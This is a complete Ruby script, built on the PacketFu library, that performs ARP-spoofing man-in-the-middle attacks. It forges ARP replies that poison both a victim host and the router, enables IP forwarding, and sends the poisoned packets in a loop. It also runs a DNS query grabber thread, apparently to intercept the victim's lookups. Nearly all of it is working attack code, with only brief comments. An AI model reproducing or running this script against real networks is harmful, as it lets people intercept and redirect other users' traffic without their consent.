#!/usr/bin/ruby
require 'rubygems'
require 'packetfu'
require 'thread'
require './gdns.rb'

$iface = "eth0"   # interface to send/recieve from
$sMac = '08:00:27:48:d2:8f'  # source mac address, eg, address to redirect victim to
$tMac = '08:00:27:5d:d8:c9'  # target mac address, eg, address to poison
$rMac = '00:24:b2:4d:b9:1d'  # routers mac address
$sIP = '10.0.0.68'        # source IP address
$tIP = '10.0.0.28'        # target IP address
$rIP = '10.0.0.1'       # router IP address

$arp_packet_target #= PacketFu::ARPPacket.new()
$arp_packet_router #= PacketFu::ARPPacket.new()

def start()
  # tell the target that your mac address is the router
  $arp_packet_target = forgePacket($sMac, $tMac, $rIP, $tIP)
  $arp_packet_router = forgePacket($sMac, $rMac, $tIP, $rIP)
  `echo 1 > /proc/sys/net/ipv4/ip_forward`
end

def forgePacket(sMac, tMac, tIP, rIP)
  target = PacketFu::ARPPacket.new()
  target.eth_saddr = sMac       # sender's MAC address
  target.eth_daddr = tMac       # targets MAC address
  target.arp_saddr_mac = sMac   # sender's MAC address
  target.arp_daddr_mac = tMac   # router's MAC address
  target.arp_saddr_ip = tIP     # target's IP
  target.arp_daddr_ip = rIP     # router's IP
  target.arp_opcode = 2         # arp code 2 == ARP reply
  return target
end

def fixSpoof()
  $arp_packet_target = forgePacket($rMac, $tMac, $rIP, $tIP)
  $arp_packet_router = forgePacket($tMac, $rMac, $tIP, $rIP)
  $arp_packet_target.to_w($iface)
  $arp_packet_router.to_w($iface)
  `echo 0 > /proc/sys/net/ipv4/ip_forward`
end

def runSpoof()
  # Send out both packets
  caught=false
  while caught==false do
    sleep 1
    $arp_packet_target.to_w($iface)
    $arp_packet_router.to_w($iface)
  end
end

begin
  start()
  spoof_thread = Thread.new{runSpoof()} 
  dns_thread = Thread.new{dns_query_grabber} 
  spoof_thread.join
  dns_thread.join

  rescue Interrupt # Catch the interrupt and kill the threads, and fix the arps
    puts "\nARP spoof stopped by interrupt signal."
    Thread.kill(spoof_thread)
    Thread.kill(dns_thread)
    fixSpoof()
  exit 0
end
